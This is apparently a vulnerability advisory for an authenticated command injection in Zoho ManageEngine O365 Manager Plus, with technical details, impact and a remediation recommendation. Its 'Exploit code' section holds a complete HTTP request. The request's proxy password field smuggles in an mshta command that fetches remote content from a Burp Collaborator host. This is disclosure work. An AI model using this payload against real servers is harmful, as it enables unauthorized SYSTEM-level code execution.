---
layout: post
title:  "Zoho ManageEngine O365 Manager Plus - Authenticated Command Injection"
tag: advisory
excerpt_separator: <!--more-->

---

Zoho ManageEngine O365 Manager Plus before Build 4419 is vulnerable to command injection vulnerability.  
<!--more-->

### **Identifiers**
 - ZVE-2021-2968

### **Instances**
  - http://example.com/TenantSettings?method=updateProxySettings

### **Affected versions**
4.4

### **Technical Details:**
It was observed that, the application do not validate proxy setting parameters before concatenating them with a dynamically generated system command. This allows an authenticated low privilege attacker (operator user in this case) to execute arbitrary command with NT_AUTHORITY/SYSTEM privileges.

### **Impact:**
The impact in this case will be authenticated RCE with NT_AUTHORITY/SYSTEM privileges via lowest privilege user account. 

### **Exploit code**
Login to operator user account and trigger the following HTTP request:

```
POST /TenantSettings?method=updateProxySettings HTTP/1.1
Host: o365.local:8365
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 219
Origin: http://o365.local:8365
Connection: close
Referer: http://o365.local:8365/webclient/index.html
Cookie: JSESSIONIDO365=D0325019FF80B5E4BB83418CB2F52016; adsolutions-_zldp=hmyub28ivdRtzEjp7jMD3WQO5rw8hIplEFcOqEBeZ9ZW26aYU7jnvCwVCi2QlE%2Bwb3qDSNrSNME%3D; JSESSIONIDO365SSO=A5B1143623A9BA8FA6491318E4D17169; O365MangerCsrf=af19089e-0e90-4a10-b736-ebf6e47b9365

PROXY_SETTINGS=%7B%22SERVER_NAME%22%3A%22192.168.0.108%22%2C%22PORT%22%3A%228080%22%2C%22USER_NAME%22%3A%22aaaa%22%2C%22PASSWORD%22%3A%22aaaa;mshta%20http://3x164pvostzg9uppxnro7a37tyzqnf.burpcollaborator.net/rce;%22%7D
```

In the following screenshot, observe that the application executes the mshta command to the defined burp collaborator server.
  ![](/assets/images/ZVE-2021-2968/1.png)

### **Solution:**
It is recommended to perform input validation on user input before concatenating it with the system command.



